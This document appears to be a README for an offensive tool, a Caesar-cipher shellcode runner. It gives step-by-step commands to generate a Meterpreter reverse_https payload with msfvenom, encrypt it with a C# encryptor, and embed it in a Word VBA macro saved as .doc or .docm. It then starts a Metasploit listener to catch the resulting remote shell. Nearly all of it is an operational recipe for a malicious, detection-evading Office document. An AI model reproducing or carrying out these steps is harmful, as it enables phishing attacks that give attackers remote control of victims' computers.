# Caesar Cipher Shellcode Runner

## Files

| File | Purpose |
|---|---|
| `vba-caesar-cipher-encryption.cs` | C# encryptor — encrypts shellcode, outputs VBA decimal array |
| `vba-caesar-cipher-runner.vba` | VBA macro — decrypts and executes shellcode at runtime |

## Usage

**1. Generate shellcode:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<IP> LPORT=443 -f csharp -o shellcode.txt
```

**2. Compile the encryptor:**

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `vba-caesar-cipher-encryption.cs`
3. Set configuration to **Release** and platform to **x64** (toolbar dropdowns or Project → Properties → Build)
4. Build → Build Solution (`Ctrl+Shift+B`)
5. Exe is in `bin\x64\Release\`

**Command line:**
```bash
# Linux
mcs -out:Encrypter.exe vba-caesar-cipher-encryption.cs

# Windows
csc /target:exe /platform:x64 /optimize+ /out:Encrypter.exe vba-caesar-cipher-encryption.cs
```

**3. Encrypt the shellcode:**
```bash
Encrypter.exe shellcode.txt
```

**4. Paste the output array into `vba-caesar-cipher-runner.vba`:**
```vb
buf = Array(254, 132, 2, ...)  ' ← replace this line
```

**5. Insert into Word:**
1. Open Word → `Alt+F11` → Insert → Module
2. Paste the full contents of `vba-caesar-cipher-runner.vba`
3. Save as `.doc` or `.docm`

**6. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```
